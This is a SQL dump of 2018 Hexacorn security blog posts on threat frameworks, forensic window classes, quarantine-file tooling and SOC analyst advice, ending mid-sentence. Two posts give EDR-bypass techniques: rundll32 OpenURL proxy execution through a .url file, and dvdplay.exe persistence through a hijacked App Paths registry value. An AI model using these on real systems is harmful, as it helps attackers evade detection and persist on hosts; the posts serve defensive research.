INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (39, 'Permanent Link to Running programs via Proxy & jumping on a EDR-bypass trampoline, Part 5', 'Hexacorn', 'March 15, 2018 ', 'Update\nAfter I posted it bohops provided one more variant:\nrundll32.exe shdocvw.dll, OpenURL [path to file.url]\nThanks!\nOld Post\nThis is nothing new, but just documenting for the sake of documenting.\nIt crossed my mind to look for all the DLLs that refer to OpenURL – an API that is exported by the url.dll – which is used to launch URLs (and was a subject of the first part of the series). I quickly discovered that ieframe.dll also exports identically named function; a quick googling around followed and I noticed it was a subject to previous analysis (CVE-2016-3353) – as a result, the vulnerability that allowed remote execution of code was patched.\nStill, the built-in functionality can help to launch other programs via proxy e.g. using the .url file:\n[InternetShortcut]\r\nURL=file:///c:\\windows\\system32\\calc.exe\nand running:\nrundll32 ieframe.dll, OpenURL <path to local URL file>\nwill launch calculator.\n \nShare this :)', 'Anti-*, EDR, Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (40, 'Permanent Link to Beyond good ol’ Run key, Part 73', 'Hexacorn', 'March 15, 2018 ', 'If you have a dvdplay.exe program on your system you can quickly do two things with it:\n\nuse it to disturb the process tree\nleveraging the fact it is a signed binary – add it to any common startup place and achieve a nice, invisible persistence mechanism, possibly bypassing some security  solutions (they will just detect entries pointing to a signed binary and nothing else)\n\nHow?\nThe dvdplay.exe program is a simple wrapper that actually calls wmplayer.exe. But not the one you would expect.\nIn order to find a path to the wmplayer, it reads the following Registry key:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\wmplayer.exe\r\n\"Path\"=\"c:\\\\malware\\\\\"\nSo… changing that path to any path in your control, you can drop your wmplayer.exe there and voila!\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, EDR, Forensic Analysis, Incident Resp', 'http://www.hexacorn.com/blog/2018/03/15/beyond-good-ol-run-key-part-73/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (41, 'Permanent Link to Threat Frameworks – some quick thoughts', 'Hexacorn', 'March 12, 2018 ', 'Update\nAdded some more ideas\nOld Post\nWe reached the stage where we have a number of threat frameworks on ‘the market’ – they all look at the threat taxonomy from different angles – they overlap, they compete, and sometimes they go in some weird directions. I’ve been thinking of the usefulness and completeness of these frameworks for a while and eventually decided to post some quick thoughts about it. What actually inspired me to write this post is the Twit posted by Rick Holland where he said:\n\nI was happy to see that I am not the only one who sees it as a new buzzword and a fad really.\nBUT\nHaving said that, I do believe there is a great need to choose _some_ threat framework and use it to model your defensive strategy around that.\nAnd I actually like Att&ck more and more.\nIf Kill Chain was very high-level, Att&ck attempts to itemize every single tactic & technique that affects Confidentiality, Integrity & Availability. This is actually a great approach as it can very directly drive the anomaly hunting, use cases, choice of additional controls, etc. Being in a position to say you cover this and that % of the Att&ck matrix with your defenses can be a very good quantitative data that can be presented to the senior management, and maybe even auditors.\nBefore you go to use the Att&ck in its current form, be aware that this is work in progress and it will certainly change in the future.\nWhy?\nBecause it’s far from being complete.\nFor instance, looking at techniques, you won’t find a lot of tricks that could be included there, or items for which description could be potentially amended:\n\nalternate data streams on NTFS\nextended attributes on NTFS\nmany persistence tricks\ncases where malware is found dormant in archives (e.g. mailboxes, backups, or remnants of very old infection) or on removable devices – it’s actually not even an active attack, but it does affect integrity of the system\ncases where artifacts are downgrading the security posture of the system (e.g. disabling UAC, changing IE zone settings, etc.)\ncases where malware belongs to old-school OSs e.g. win95/DOS (risk is minimal, but threat taxonomy should include them)\nEICAR\nremnant from internal pentesting (sometimes can be detected long after the actual test)\nviral infection, including unusual infection methods like EPO (Entry Point Obscuring)\nI didn’t seem to be able to find worm\ntrojanized applications (e.g. web shells, but also fake applications on torrent sites)\nadware, PUA/PUP (is it considered an attack if a legitimate software is bundled with adware?)\ntracking cookies (not sure if it fits)\natombombing and propagate code injection tricks\nenabling DEBUG/VERBOSE flags of the applications (e.g. to enable logs to include track data that bad guys can collect)\nhooking is a very loaded technique – it’s actually a class of techniques; the current description talks mainly about Windows, but misses EAT hooking, COM hooking, SSDT hooking, and there is also hooking that can be observed on a web side (e.g. hooking of functions managing php buffers or adding javascript callbacks); there are also cases where hooking is incorporated via a subtle, small patching inside a native OS binary that loads a malicious DLL; and plenty of other tricks like this (I once saw a vendor DLL replaced with a malicious one that injected itself as a man-in-the-middle, observing all buffers transmitted, in plain text)\n‘Modify Registry’ is such a loaded technique too – not sure if it should be listed there as a separate technique, since it’s a class of techniques really… on the other hand, I don’t know where else we could place it\nAccidental data leakage (e.g. github, wikipedia, translation services)\nLSASS Driver – ‘driver’ word may be a bit misleading – the word is usually reserved for kernel mode drivers\netc.\n\nThere is also additional complexity which comes from the fact the framework tries to cover Windows, OS/X and Linux platforms in one table (correction: there are various views available, so it helps a lot). Obviously, digging into each item will give you lots of information and references.\nNow, it’s easy to sit down and criticize.\nI have tried to build some taxonomy in the past myself and it’s an extremely daunting task to build such a multidimensional database – and Att&ck already contains lots of very useful information – we really need to applaud the efforts of the Mitre team!\nFad, or not we are slowly moving from technology- or control-oriented approach to security to more measurable, and reliable risk management-driven approach.\nShare this :)', 'Incident Response, Preaching', 'http://www.hexacorn.com/blog/2018/03/12/threat-frameworks-some-quick-thoughts/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (42, 'Permanent Link to Certain Windows… stay classy… part 2', 'Hexacorn', 'March 11, 2018 ', 'In one of the older posts I listed a number of very recognizable windows classes that can be found hard-coded as strings inside various programs (including malware). The intention there was to help with a recognition of a compiler/protector/installer that was used to create/build/protect the file.\nI thought it would be good to expand this list with a whitelist of common classes created by various legitimate Windows applications. Such list may help to determine which windows classes are potentially anomalous (e.g. if you run ‘windows’ or ‘wintree’ command in volatility).\nHere’s a short list I came up so far – if you see any class missing, please let me know and I will add it:\n\n$$$UI0Background\n_SearchEditBoxFakeWindow\n{37E561C9-40E3-44de-AF62-CECD75524364}\nActionsMenuOwner\nAddress Band Root\nAMNotificationDialog\nAppResizeAcc\nAudioDevStubWindow32\nAutoplayHandlerChooser\nAVIWnd32\nBreadcrumb Parent\nButton\nCabinetWClass\nCDDEServer\nCDVDMsgWindowClass\nCicLoaderWndClass\nCM Monitor Window\nComboBox\nComboBoxEx32\nCOMPDESK_DISPALYCHANGE_CLASS\nCompose_CvPgPreview\nConnectionManagerMsgProc\nConsoleWindowClass\nCtlFrameWork_Parking\nCtrlAccWindow\nCtrlNotifySink\nCustomEventWindowClass\nDDE Channel\nDDE Server Window\nDDE ViewObj\nDeviceUpdateClass\nDIEmWin\nDocWndClass\nDragWindow\nDsPropNotifyWindow\nDummyDWMListenerWindow\nDwm\nEalMessageWindow\nEdit\nelevationdummy\nEnhancedStorageAuthentication\nERCUITHREADMARSHALLER\nEvent Viewer Snapin Synch\nEVRFullscreenVideo\nEVRPowerMsgWindowClass\nEVRVideoHandler\nEvtQProcWndClass\nFaxME_DocHost\nFaxTiffView_Host\nFDBthProviderClass\nFloatNotifySink\nFn Notify Window\nFocusMonitorWindowClass\nGDI+ Window\nGestureArbitrationEngineWindowClass\nGhost\nGhostDivider\nGRIDWNDCLASS\nHH CustomNavPane\nHH Parent\nHH SizeBar\nHH_API\nHidServClass\nHighlightCursorClass\nHitTestWorker\nHostCtrlAccWindow\nIEFrame\nInkEditReflectClass\ninvisible bmp window\nIsolation Thread Message Window\nItemWndClass\nJobPropWnd\nJointDivider\nJointResizeAcc\nKBEMWndClass\nL21DecMsgWnd\nlistbox\nLOCATIONNOTIFICATION\nMagnifier\nMCI command handling window\nmdiclient\nMDRESNOTIFYCLASS\nMESSAGE\nMGMTAPI Notification Class\nMNC_TaskmanWindow\nMobilityCenterHelpButton\nMobilityCenterIcon\nMobilityCenterStatusText\nMobilityCenterTileName\nMouseMonitorWindowClass\nMRT\nMS:SyncNotificationWindow\nMS:WPDStatusProviderNotificationWindow\nMSAA_DA_Class\nMSCTFIME Composition\nmsctls_progress32\nmsctls_statusbar32\nmsctls_trackbar32\nmsctls_updown32\nMstscRemoteSessionsMgrWndClass\nMTVDragInputHandler\nNarratorTIEWIndowClass\nNarratorTouchWindow\nNotepad\nNotificationsMenuOwner\nOCHost\nOE_Envelope\nOleDocWndClass\nOleSrvrWndClass\nPalette Watcher\nPCALUA\nPowerCPL Message Window\nPPCHiddenWindow\nproquota\nPRSEVENTRECEIVER\nRadioButtonList\nRdpClipRdrWindowClass\nRdpSaInvitationManagerHiddenWindowClass\nRDPSoundDVCWnd\nRDPSoundInputWnd\nRdvSessionMonitorClass\nReBarWindow32\nRectWndClass\nREListBox20W\nRelMonGraphWindow\nRICHEDIT\nRICHEDIT50W\nRunDLL\nRunLegacyCPL\nScroll\nSCROLLBAR\nSearch Box\nSearchEditBoxWrapperClass\nSeparatorBand\nShell Preview Extension Temporary Parent\nShell_Dim\nShell_SecondaryTrayWnd\nShell_TrayWnd\nSI WMP sync hidden window\nSJE_FULLSCREEN\nSlideshowCache\nSlideshowManager\nSoftKBDClsC1\nSoftKBDClsT1\nSoftkbdIMXOwnerWndClass\nSPACEAGENT!PNP!MESSAGEWND\nSrvrWndClass\nSSDemoParent\nStatic\nStubNtPrintWindow\nStubPrintWindow\nStubWindow32\nsync hidden window\nSysHeader32\nSysLink\nSysListView32\nSysMonthCal32\nSysPager\nSysTabControl32\nSystemMonitorWindowClass\nSystemTray_Main\nSysTreeView32\nTabCal_WndClass\nTabletModeCoverWindow\nTabletModeInputHandler\nTapi32WndClass\nTask Host Window\nTaskListOverlayWnd\nTaskListThumbnailWnd\nTextRendererMsgProc\nTiBusUpdate\nToolbarWindow32\ntooltips_class32\nTravelBand\nTrayDummySearchControl\nTrayInputIndicatorWClass\nTrayNotifyWnd\nTrayShowDesktopButtonWClass\nTSC_POPUP_PARENT_WNDCLASS\nTSMF Geometry\nUIAInvokeHelperWndClass\nUIManager Message Window\nUniversalSearchBand\nUpBand\nURL Moniker Notification Window\nUserAdapterWindowClass\nVBBubbleRT6\nVBFocusRT6\nVisualViewportMessageWindow\nVolNotifySink\nWdcGraphWindow\nWebInstanceCoreInputWindow\nWebview Window\nWiaPreviewControl\nWMPMessenger\nWMPSimpleMessageWindow\nWMPTransition\nWorkerA\nWorkerMessageWindow\nWorkerW\nWusaHidden\nXAMLMessageWindowClass\nXAMLWebViewHostWindowClass\nXCPDeferredClass\nXCPTimerClass\nXMLMimeWnd\nYO\nZIP Folder STUB window\n\nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2018/03/11/certain-windows-stay-classy-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (43, 'Permanent Link to DeXRAY 2.06 update', 'Hexacorn', 'March 1, 2018 ', 'A few weeks ago Brian contacted me about his research on Symantec Quarantine files. He has already worked on some parts of DeXRAY and he suggested that he could improve the code handling the VBN files. And so he did – the result is lots of new code that enables DeXRAY to decrypt these files much better!\nBrian wrote a post explaining the internals of Symantec VBN files and you should definitely go and read it!\nReally great piece of work. Thank you Brian!\nYou can download the latest version of DeXRAY here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ, System Watcher’s <md5>.bin)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA) – 2 versions\nMalwareBytes Quarantine files (QUAR) – 2 versions\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, DeXRAY, Software Releases', 'http://www.hexacorn.com/blog/2018/03/01/dexray-2-06-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (44, 'Permanent Link to Endpoint Detection and Response (EDR) solutions sheet – update', 'Hexacorn', 'February 25, 2018 ', 'I finally caught up with some more updates; thanks to Atul for adding OSQuery and PolyLoygyx, and Dori for Secdo. Also fixed some formatting and did minor edits.\n \nThe latest EDR sheet can be found here.\nThe explanations of columns can be found here.\nAs usual, if you find anything wrong/needing some amendment, please do let me know. I’ll fix it.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2018/02/25/endpoint-detection-and-response-edr-solutions-sheet-update-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (45, 'Permanent Link to How to become the best SOC Analyst E-V-E-R', 'Hexacorn', 'February 25, 2018 ', 'Update\nSince I am getting a varied feedback on this article, I want to clarify a few bits:\n\nI tried to incorporate many things that I wish someone told me in the past when I started working tickets\nIf it comes across as preachy or hierarchical it was not the intention – seriously… whoever works tickets knows that many things here are real world examples of issues we have to deal with\nIf you take an offense reading about hierarchy, and me positioning myself as ‘mentor’, and calling junior people ‘grasshoppers’ – c’mon… this is all corporate language at work, also I must mention I am not a native speaker and I may be missing some nuances; people who know me personally know that I am the first one to admit an impostor syndrome; I also want to emphasize that I do recognize the expertise of people I happened to mentor – they teach me me back a lot and I refer to it in the first paragraph (I can easily bring up some anecdotes from my past where one of the juniors has demoed some really cool stuff about mobile forensics – an area where I don’t have much experience – it was a reversed role, I was the grasshopper and she was the mentor there).\nAlso, pretty much every single corporate org assigns buddies, and runs mentor programs where juniors are mentored by others; yes, it’s definitely arrogant to say you are a mentor and they are mentorees, but please give me a more accurate English word to call that relationship & I will update the article; and yes, there is SANS Mentor program too; semantics is a fun topic to explore, but if the only feedback you give me is that you don’t like my ‘entitled’ tone, then thanks for assessing the 4-5h of work that went into writing this post with your linguistical nitpicking\nIf you take offense in profanities, rest assured, I have removed them for you – however, if you have never called a ticketing, AV, EDR, IDS/IPS software a piece of @#$%^&, this post is probably not for you anyway(?); hmm there is not much space for political correctness in the necessarily emotional piece that this post aims to be…\nWhen I refer to a SOC Analyst, I mean a junior (in terms of skills in DFIR) person, not a hardcore, technical person that used to be called SOC Analyst in the past (typically working on network side, probably today referred to as NOC)\nSo many people in our industry focus on the cool stuff: certs, EDR, data science, threat hunting, memory forensics – pretty much L2 and L3 stuff; I find that there is a huge, often misunderstood and definitely unfairly placed burden on the L1 analysts – they are very rarely respected, the tools they are forced to use suck, and the analysts are also often incorrectly guided to do their work, and to grow (I know I generalize, but this is what I came across in the past)\n\nOld Post\nOver last 15 years I had a privilege of training and mentoring a number of junior people, often much smarter than me in their own areas of expertise (programming, network, admin work, routers, support for various tools/devices, etc.), but still either completely, or partially green when it comes to SOC/IR/DFIR/RCE space. I will lie if I say I was always happy about things these ‘grasshoppers’ were doing, but it would also be a lie if I said I was always right. And well, I was once a grasshopper myself, and definitely (and perhaps sometimes even intentionally) pissed off more than one person with my stupid shenanigans, and probably still do…\nWe all start somewhere, and we (hopefully) continue to grow.\nThe fun of leading and mentoring teams is actually there – it is the individuals that you come across while doing this work; believe it, or not, among them you will find real gems, and I mean it!\n– these guys will teach you back many things you don’t even have an idea exist.\nInterestingly, as our knowledge gets pretty rusty and it does so incredibly quickly, I actually find the cooperation with the security youngsters very rewarding – they make me stay up to date – they are asking questions which in return force me to actively explore the vast areas of my… ignorance.\nYes!\nThere is more to it out there than the actual expertise. This is because our field expands kinda exponentially and while I may be focused on Wintel attacks, there is the whole domain of *NIX, mainframe, IoT, or even DDoS, or appsec attacks that I am either not aware of, or barely aware of (I am actually a ‘grasshopper’ in these fields). It would seem our ITSEC expertise is more about indexing things we don’t know about…\nSo… the good news it that some of these guys live it the same way you lived it 5-10-20 years ago. Yup. Good to talk to them and… learn.\nToday’s post is not about the glorious day of enlightenment though. I thought I will write a quick tutorial-like piece, or a check-list if you will with the aim of helping new analysts who enter the L1 function w/o much experience in the field and perhaps wanting to grow as security professionals.\nIf you are still reading it I assume now that you are the newly-hired individual in the L1 SOC function – you may be a SOC Analyst, SIEM analyst, Junior CERT Analyst, whatever. You just joined the company directly, or act as a part of MSSP company, and perhaps (in some cases) are with  your company for a few months, but still don’t have much clue what’s going on. Let alone know ‘how to look like you are doing something useful’.\nAlso, chances are that you are probably already hating your job, and your manager, or your employer \nBecause… these stupid tickets.\nThis is practically what you do all day long. The big words and ravishing dreams of being a hacker, computer security expert, one that perhaps one day will have 1 million followers on Twitter, and even be invited to talk at TED, one that people worship… one that maybe even FBI arrests… one that is so special…it all fades away with that every, single ticket you have to open, fill-in, and eventually close, or leave for future generations to sort out.\nDon’t despair. You will get over it. We’ve all been there.\nOne of the first questions I typically ask you – what is the most important thing while doing tickets. You don’t know me yet – you just know I am your lead/manager. You take my question very corporate-seriously and answer that it is indeed a very important task, and that it is incredibly important to do the tickets right, and give your best to add / enrich ticket information; and perhaps you already know, or have overheard that ‘if auditors read data from YOUR ticket when it is provided as an evidence they may ask questions’, so you may add that we obviously need to do tickets well enough so auditors will be happy.\nAnd of course, you want to improve, learn from mistakes, and will definitely work harder to get better at working them in the future!\nThese are all nice and cozy answers, and I am grateful for a second, and a second only, because while I may be the almighty know-it-all boss du jour, you are just feeding me with the stuff that my vanity happily feasts on.\nSo I steer you towards the one and only proper answer – one that often surprises you, and then we have a good laugh – because for the first time we talk not like the boss and the employee, but like two brothers in arms, and human beings really. And that’s because I worked tickets before and the answer I give you is this:\n– the one, and only, most important thing while doing the tickets is actually NOT opening them, or if you really have to, opening them, and closing them as soon as possible! Escalations, external dependencies on other teams – will kill all the fun, SLAs, and often expose you to scrutiny.\nA-HA!\nWe both know doing tickets is a nightmare. Most of it is a mundane, absolutely idiotic waste of time, a busywork, a grass painted green over and over again, an unexciting, repetitive, boring task.\nBUT IT HAS TO BE DONE!\nDon’t despair. Everyone knows it. Everyone hates it. And this post will help you to deal with it.\nThe TL;DR; answer is this: convert this ticket hamster wheel to a game with a purpose.\nThe game with purpose is one of the creations of the mind of Luis von Ahn (the CAPTCHA and Duolingo guy).\nThe ‘purpose’ that works for you is your own business really – you have to kinda work it out by yourself; and the ‘game’ bit is like any other game – who cheats, gets there first!\nMy personal purpose while doing tickets was always and still is: WIN TIME.\nThe rationale is pretty simple. We actually die. Yes, we do. Having a time that is gained by efficient management, or any sort of trickery is your life being utilized in a better way; a time is a luxury; let’s be frank: any ‘free’ excess of it – is a gift.\nWhen you have time, you can dedicate it to more rewarding activities. They should be strictly related to your work, of course, otherwise you will get fired, but perhaps with a bit of planning these free cycles you win may actually open doors for you to areas that are little more interesting than the tickets themselves. And more rewarding indeed, because what if… the time you earn by being efficient allows you to focus on the next step in your career?\nIsn’t that worth it?\nSo… without further ado, here’s a list of ideas I have used/explored, or otherwise practically used in my past lives; this is by all means not a full list and I am sure some of my bros-in-arms or sis-in-arms can chip in and add their 5 cents of advice – I sincerely hope so:\n\nBEFORE YOU BEGIN\n\nWhat is that you do?\n\nFill-in the tickets? yeah… but…\nProvide enough info to L2 (CSIRT/CERT/SIRT/etc.)? yeah.. but….\nThink of your work in consulting terms;\n\nWho is your client? Who will read your tickets?\nTypically L2 (CSIRT/CERT)\nTypically your lead/manager\nSometimes no-one specific (other than your system of record storing it and compliance guys providing it as an evidence to auditors)\nWhat is your scope of work and area of influence?\nL1 work only\nAre you able to escalate the problems to anyone if you don’t understand something?\nTalk to people who have more experience than you! Show them what you did, why, and you will get a good feedback & support!\nTechnical people love to explain, even show off. Ask direct question. Don’t challenge them or assume they are uneducated. Most of the time they have done L1 work before and are fully capable analysts that can GUIDE you. Also, they sometimes may be wrong, so let them know when you spot their mistake!\n\n\nSo… Ask questions!!! Many of them. Interact!!!\nBore the L2 and your manager to death. It’s their role to GUIDE you.\n\n“Why do we do things the way we do?”\n“When I look at the data, what parts of it are important?”\n“What is the meaning of all these fields in the proxy logs?”\n“I did this and this and that. What else could I do?”\n“Where can I read more about it?”\nAsk\nAsk\nAsk\nAnd then nag them to formalize it in a playbook, process guide\n\n\n\n\nRead about The Alexiou Principle \n\nWhat question are you trying to answer?\nWhat data do you need to answer that question?\nHow do you extract that data?\nWhat does that data tell you?\n\n\nOnce you get the above, you are actually en route to become a very good investigator (L1 –> L2 –> L3)\n\ni.e. the one that is a very focused minimalist, remaining objective, and his/her reports ‘write themselves’… these that ‘fly’ through the vast amount of data and can spot the bad guy with ease\n\n\n\n\nTICKETING SYSTEMS\n\nFACTS:\n\nMost of them are absolutely idiotic, over-engineered, clumsy old-fashioned, inflexible and bloated, slow pieces of software; often designed in late 90s, or early naughties; they are often a piece of software **** really\nWhy?\n\nBecause they rarely follow the SOC/IR workflow\nBecause their UI sucks\nBecause it takes forever to fill them in, and they typically don’t work on many browsers, so you are stuck a.k.a. bound to use the one and only required (a.k.a. supported) browser\nBecause they were really not designed to handle security alerts, bundles of such alerts (campaigns), and do not scale well\nBecause they were not designed to support Data Across Border and GDPR issues\nIn MNCs, apart from DAB and GDPR issues, you have the problem of access; it’s a difficult problem to solve permanently for SOC analysts across the whole globe; and it’s really very tempting to store it all in cloud that anyone can access\nMany older products do not support working on multiple tickets at the same time; yes, 1 cookie=1 ticket… it’s incredibly inconvenient\n\n\nEditing itself, or pasting to ticketing systems is often a miserable job:\n\nYou edit it, you paste it, formatting is immediately ruined, f.ex. things are not aligned properly, etc.\nUnfortunately, ideas promoted by ‘web-oriented’ companies force us to believe the web editing will take over; no, it won’t; it’s still a miserable experience and will stay as such for a long time; especially where you have to fill-in a number of fields\nUnfortunately, nowadays all of ticketing systems are web-based. sigh…\nI have been waiting for it for over 15 years and it’s actually getting worse and worse\n\nMy experience went from a blaspheming Lotus Notes-based bug tracking systems, through awful Java/Oracle-based Frankenstein’s Monsters, then mediocrity of Flash/Silverlight idiocy, and now we arrived at the Web 2.0 (soon Web 3.0) and ‘new’ UI concepts and paradigms that force you to click 20 times to do a _simple_ thing, because everything needs to be animated or expanded/drilled-down numerous times (think of ‘Read More’ buttons that shows you ONE additional line of text), and on the way break all the UI design metaphores that we so got used to using the native OS applications over last 20-30 years!; web broke all these metaphores\nThe guys who design IR ticketing systems really need to understand that less clicks to close an IR ticket=win for the analysts!!! Also, they need to understand what data is really important to show in previews – IR ticketing is really about speed-closing\n\n\n\n\nSaving work – you will often find that some fields are mandatory to fill-in\n\nSometimes you forget one and you may try to submit the form – a weird error message shows up; then you have to edit it all over again\nSometimes all the work is gone w/o much reason, or when you submit and your broadband/VPN goes kaput\nSometimes the page will refresh out of nowhere\nSometimes you will click a wrong mouse button, or press a wrong keyboard short-cut – the browser will take you to another page\nSometimes you accidentally activate a shortcut by mouse, access history, click it, click a bookmark, your VDI will freeze, or whatever random happens\nAnd yes, this really happens – your work is gone in a blink of an eye and there is no way to recover it\nSo.. thank you stateless web UI experience based on an assumption users don’t make mistakes and there is no VDIs, no network bottlenecks…\nThe Windows OS UI as hated as it is by many provides a very intuitive way to fill in all this stuff and supports automation VERY well (think: TAB key used to change the focus between fields on a Windows dialog box vs. fields on the web page that need to be activated by mouse each time; the first one can be driven by macromakers, the second _sometimes_ by bookmarklets)\n\n\n\n\nHOW TO CHEAT:\n\nCREATING TICKETS\n\nIf possible, use automated ticketing system (mail comes in –> ticket, with an appropriate data enrichment) – no need to do copypasta\nIf automation is not possible, use boilerplates/bookmarklets/macro makers/grease monkey scripts/dedicated in-house built browser plugins to fill-in the most typical cases; use the templates/bookmarklets (read below), and manually correct fields that require correcting for less usual cases\nIf there is an API (REST, SOAP), task someone to write a nice python/ruby/perl script to close tickets that can be closed automagically\nSame as above, re-prioritize the ticket via script, if possible\nIf you have an access to a dev team provided by ticketing system vendor – USE THEM – while they charge exorbitant money they can do a lot of tweaks that you don’t even know exist (because they have done it for 200 other clients and know what issues to fix/what problems to avoid)\nAsk your manager, L2\nGoogle your ticketing system – see what other ppl do\nNmap and ‘light pentest’ your blackbox ticketing system (perhaps SOAP or other ‘goodness’ is there? /’goodness’ is a relative terms/)\n\n\n EDITING\n\nEdit the content of the ticket body in an external program, if possible; it can be Notepad, Notepad++, Ultraedit, Textpad, SciTE, VIM, WordPad, WinWord – whatever works for you; keep these notes in a file that you frequently save; work on it in ‘append to its end’ mode\nUsing external editors gives you a full-power of the editor, not some web-based wannabe with very small input fields, limited formatting, non-resizable fields, broken Undo /even Confluence fails here sometimes/, no proper support for navigation in the editor, no support for vertical editing, no search&replace with regexes, no support for multiple files search and replace, etc. and no room for mistake really….\nHaving to fill-in a dozen or a few form fields is not for faint-hearted; simplify it with a macromaker/bookmarklet/API, if possible – I mentioned it before, but will repeat it a few times; optimize, automate, cheat using GUI-automation tools\nUse more than one editor, if needed\nLearn to treat Excel as one of the editors; the amount of stuff you can do either with Excel itself, or by combining the strengths of Excel, with a good programming editor e.g. Ultraedit, or cygwin / unix tools, and sometimes bit of scripting will really surprise you!\nLearn to program, script, write macros in general. This goes a long way. This is probably the most important advice. Think like a programmer/coder – you will get far by cheating manual editing with some simple algo to do work for you.\n\nNote – editors allow macros/templates; you could define them and use them for various purposes\n\n\nUse keyboard more than mouse, if possible!!! (can’t stress this one enough; LOOK UP shortcuts for the programs you use, including web pages e.g. ‘E’ on Confluence enters the ‘Edit’ mode; ‘//’ enters a date, etc.)\nOutlook allows you to select emails and then when you copy them to clipboard, you can paste their ‘main’ headers (as per set up view) to excel\nUse VBA and Office Macros!!!\n\nThey are not just malware, they offer awesome automation functionality you can use to speed up processing stupid things;\nExample:\n\nExporting batch of emails from Outlook so you can process them with a python/perl/ruby script afterwards\nThis is a great time saver (e.g. instead of looking at every email, you extract all every say 24h and run through your script that excludes white-listed entries, highlights blacklisted entries, does data stacking, perhaps saves it in a local database for future comparisons, etc.)\nDoing stats on Outlook folders\n\n\n\n\nAgain, Ad nauseam, read help for your editor of choice; learn keyboard short-cuts; read it again\n\nI keep learning new things about Total Commander or Excel every day, despite using it for 20 years!!!\n\n\nInstall Puretext – it’s a brilliant small program that allows you to paste w/o formatting\nAnother similar program is Ditto (http://ditto-cp.sourceforge.net/)\nIf you paste data from tickets in Outlook, use CTRL+ALT+V shortcut to choose pasting type\nLearn Excel shortcuts\n\nctrl+; for entering the current date\nctrl+: for current time\nctrl+1 for formatting\nshift+F8 for selecting all content within a block\nctrl+pgdn and ctrl +pgup to navigate sheets,\netc. –\nit’s much faster;\nthen check vlookup, pivot tables, “&” for concatenation, etc,\n\n\n\n\nTRIAGE\n\nStick close to the source of the alert\n\ni.e. research logs RELATED to the event;\n\nby the time frame\nby the host name\nby the user name\nby the risk name\nby the phishing campaign\nby the type of event\netc.\nDon’t go ballistic on VT/HA/malwr/virusbay/urlquery if you don’t know/understand what happened on the box itself!!!\nThreat Intel and blog posts are OVERHYPED\n\nDon’t read blog posts until your logs tell you what happened; until you have some hypothesis to verify\n\n\nAgain, for that, stay close to the event that triggered the alert !!!\n\nThink ‘what happened there’ before you go with further triage/analysis tasks\n\n\nSo… don’t go to VT, HA, or googling around in general as a first ‘itchy fingers response;\n\nIt’s all helpful, but it’s not really answering the 4 of Alexious principle questions\nplus\nVendors are sometimes vague\nVendors are sometimes wrong\nPeers in the community are sometimes vague\nPeers in the community are sometimes wrong\n\n\nIf you see an AV alert – go to your vendor page – UNDERSTAND what the threat/risk name tells you; is it a virus (modifies files), is it a ransomware (encrypts files), is it a heuristic detection (often FP), etc.\nJoin groups, forums (e.g. OWASP and local chapters/meetups, SANS, FIRST, various CERT notification emails, FS-ISAC, etc.), Twitter – learn about ‘new’ before media outlets pick it up\n\n\n\n\nLook at the AV, IDS, Proxy logs;\n\nLook at as many sources as possible;\nAnd if it may sound weird… avoid firewall logs at first, unless absolutely necessary;\nWhy?\nAttacks shifted to higher levels of TCP/IP stack, lots is happening on application layer\nDon’t underestimate firewall logs though, you will definitely find them useful in more advanced attacks (they may be actually the only logs you will have to prove someone stole your data!)\n\n\n\n\n TEMPLATES/BOILERPLATES\n\nIf some tickets are the same, or nearly the same – keep a boilerplate with a text already prepared for a copypasta; this will save time, and will ensure you are consistent (this is why writing stuff using an external editor is also handy – you can keep all your edited stuff in one place; yes, create a ‘book’-like document and type your stuff there; you will notice patterns, and you will re-use existing text more than once); cheat, & optimize\nUse any type wiki, if possible; this is so much better than Sharepoint!!!\nPreserve chats, most of the good knowledge is an organic knowledge that you learn ‘overheard on a virtual grapevine’; guys who work in the company for longer is your GOLDMINE; treat them with a respect, and they will teach you about a lot of internal/organic things.\nDon’t be an @#%^&; seriously, be humble; better be open about not knowing something than making a fool of yourself pretending to know it all; but still, be an @#%^& sometimes, when you see others ‘not getting it’ – stick to your guns and explain what they are missing\nDO NOT MANSPLAIN, but point to wiki, blogs, articles, give CONTEXT…\n\nI can’t count how many times ppl asked me some stuff and I always come back with:\n\n‘can you elaborate?’\n‘can you give me more context?’\n\n\n– when you ask questions start from the 